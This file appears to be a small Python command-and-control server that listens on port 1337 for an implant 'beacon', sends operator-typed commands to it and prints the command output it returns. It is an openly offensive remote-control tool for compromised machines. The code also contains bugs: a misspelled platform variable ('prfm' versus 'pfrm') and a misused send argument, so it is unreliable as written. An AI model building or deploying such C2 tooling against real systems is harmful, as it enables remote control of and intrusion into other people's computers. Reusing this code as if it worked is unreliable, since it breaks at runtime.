from signal import signal, SIGINT
from sys import exit
import socket
import time
import platform

# Create the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket successfully created")

# Bind to the port
port = 1337

s.bind(('', port))
print("Socket bound to %s" % (port))

s.listen(5)
print("Socket is now listening")

def handler(signal_recieved, frame):
  print('\nQuitting 1337 c2...')
  s.close()
  exit(0)

def main():
  prfm = platform.system()
  while True:
    print("Listening for beacon...")
    # Waits to continue until connection is accepted
    c, addr = s.accept()
    print("Beacon connected from:", addr)

    # data_size = int(bytes.decode(c.recv(8).rstrip(b'\xfe')).strip('\x00'))
    # print(data_size)
    # print("Size of data from beacon: " + str(data_size))
    # print("Got data from beacon: ")
    data_recv = bytes.decode(c.recv(1))
    while 1:
      data = c.recv(1)
      if (data == b'\xff'):
        break
      data_recv += bytes.decode(data)
    print(data_recv)

    strToSend = input("> ")
    # Send a string to the beacon
    binCommand = (strToSend.ljust(1024, '\0')).encode("utf-8")
    # print("Command len: " + str(len(binCommand)))
    if pfrm == 'Windows':
      c.send(binCommand)
    else:
      c.send(binCommand, len(binCommand))

    if (not strToSend == 'quit'):
      # Receive output one character at a time until the end output character (0xFF)
      output = bytes.decode(c.recv(1))
      while 1:
        data = c.recv(1)
        if (data == b'\xff'):
          break
        output += bytes.decode(data)
      print(output)
    # Close the socket connection
    c.close()

if __name__ == "__main__":
  signal(SIGINT, handler)
  main()